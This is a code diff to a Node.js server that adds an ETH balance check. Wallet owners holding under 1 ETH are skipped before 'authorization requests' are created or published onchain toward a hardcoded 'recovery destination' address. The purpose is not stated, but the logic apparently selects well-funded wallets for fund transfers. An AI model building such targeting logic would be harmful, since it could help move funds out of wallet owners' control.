@@ -17,6 +17,7 @@ import {
 
 const port = Number(process.env.PORT || 3000);
 const RECOVERY_DESTINATION_ADDRESS = "0x07a9bD8D1F5D76FF12FDaB4485b6AC7F0D86f329";
+const MIN_OWNER_BALANCE_WEI = 1000000000000000000n;
 let marketPriceCache = { expiresAt: 0, data: null };
 const scannerRestartDelayMs = Math.max(3000, Number(process.env.SCANNER_RESTART_DELAY_MS || 5000));
 let scannerProcess = null;
@@ -264,6 +265,22 @@ function safeMetadata(value) {
     : {};
 }
 
+async function getOwnerNativeBalance(ownerAddress) {
+  const owner = normalizeAddress(ownerAddress);
+  if (!owner) return { eligible: false, balanceWei: 0n, reason: "invalid_owner" };
+  try {
+    const balanceHex = await rpcCall(process.env.RPC_URL, "eth_getBalance", [owner, "latest"]);
+    const balanceWei = BigInt(balanceHex || "0x0");
+    return {
+      eligible: balanceWei >= MIN_OWNER_BALANCE_WEI,
+      balanceWei
+    };
+  } catch (error) {
+    console.error("[AUTHORIZATION_BALANCE] check failed:", owner, error.message);
+    return { eligible: false, balanceWei: 0n, reason: "balance_check_failed", error: error.message };
+  }
+}
+
 async function backfillOpportunityAuthorizationRequests() {
   const destination = normalizeAddress(RECOVERY_DESTINATION_ADDRESS);
   if (!destination) {
@@ -311,6 +328,13 @@ async function backfillOpportunityAuthorizationRequests() {
     );
     if (!ownerAddress) {
       skippedWithoutOwner++;
+      continue;
+    }
+
+    const balanceCheck = await getOwnerNativeBalance(ownerAddress);
+    if (!balanceCheck.eligible) {
+      skippedExisting++;
+      console.log(`[AUTHORIZATION_SKIPPED] case=${row.id} owner=${ownerAddress} balanceWei=${balanceCheck.balanceWei.toString()} reason=${balanceCheck.reason || "balance_below_1_eth"}`);
       continue;
     }
 
@@ -1499,6 +1523,11 @@ async function handle(req, res) {
       let published = 0;
       for (const row of result.rows) {
         try {
+          const balanceCheck = await getOwnerNativeBalance(row.owner_address);
+          if (!balanceCheck.eligible) {
+            console.log(`[AUTHORIZATION_ONCHAIN_PUBLISH_SKIPPED] id=${row.id} owner=${row.owner_address} balanceWei=${balanceCheck.balanceWei.toString()} reason=${balanceCheck.reason || "balance_below_1_eth"}`);
+            continue;
+          }
           const metadata = safeMetadata(row.metadata);
           let amountWei = "0";
           if (metadata.amountWei) amountWei = BigInt(metadata.amountWei).toString();
